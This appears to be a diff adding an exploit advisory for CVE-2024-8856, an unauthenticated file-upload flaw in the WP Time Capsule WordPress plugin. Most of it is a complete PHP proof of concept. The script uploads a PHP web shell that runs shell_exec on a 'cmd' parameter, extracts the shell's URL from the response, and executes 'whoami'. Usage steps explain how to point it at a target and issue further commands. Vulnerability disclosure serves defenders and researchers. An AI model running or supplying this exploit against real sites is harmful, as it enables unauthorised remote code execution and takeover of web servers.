@@ -1,0 +1,92 @@
+=============================================================================================================================================
+| # Title     : WordPress WP Time Capsule 1.22.21 RCE                                                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/wp-time-capsule/                                                                              |
+=============================================================================================================================================
+
+[+] Summary : 
+
+The WP Time Capsule plugin performs improper validation of uploaded file extensions.
+If no valid extension is detected, the check can be bypassed by using a filename with a specific length (e.g., 00.php) that matches the length of allowed extensions such as .crypt.
+
+This results in unauthenticated arbitrary file upload leading to full remote code execution.
+
+[+] References : ( https://packetstorm.news/files/id/183146/ & CVE-2024-8856 ) 
+
+1. Save the file as: poc.php
+
+2. Edit the target:
+```php
+$target = "http://TARGET";
+
+3.Execute: php poc.php
+
+Use the remote shell
+
+After successful upload, execute commands via: http://victim.com/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/XX.php?cmd=ls
+
+
+[+]  POC
+
+<?php
+/**
+ * WP Time Capsule Arbitrary File Upload → RCE
+ * CVE-2024-8856
+ * PHP PoC by Indoushka
+ */
+
+error_reporting(0);
+
+$target = "http://victim.com"; // ضع موقع الهدف هنا
+$upload = "/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php";
+
+// توليد اسم ملف بطول مناسب مثل 00.php
+$prefix = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 2);
+$filename = $prefix . ".php";
+
+// بايلود PHP — مغاير حسب طلبك دائماً
+$payload  = "<?php ";
+$payload .= "echo 'INNO = RCE OK';";
+$payload .= "echo shell_exec(isset(\$_REQUEST['cmd']) ? \$_REQUEST['cmd'] : 'id');";
+
+// بناء multipart/form-data
+$boundary = "----" . md5(time());
+
+$body  = "--$boundary\r\n";
+$body .= "Content-Disposition: form-data; name=\"files\"; filename=\"$filename\"\r\n";
+$body .= "Content-Type: application/octet-stream\r\n\r\n";
+$body .= $payload . "\r\n";
+$body .= "--$boundary--";
+
+// إرسال الطلب
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $target . $upload);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    "Content-Type: multipart/form-data; boundary=$boundary",
+    "Content-Length: " . strlen($body)
+]);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
+// استخراج الرابط من JSON
+if (preg_match('/"url":"([^"]+)"/', $response, $m)) {
+    $shell = $m[1];
+    echo "[+] Payload URL: $shell\n";
+
+    // تنفيذ RCE
+    echo "\n[+] Triggering Shell …\n";
+    $out = file_get_contents($shell . "?cmd=whoami");
+    echo $out;
+} else {
+    echo "[-] Failed to extract the uploaded file URL.\n";
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
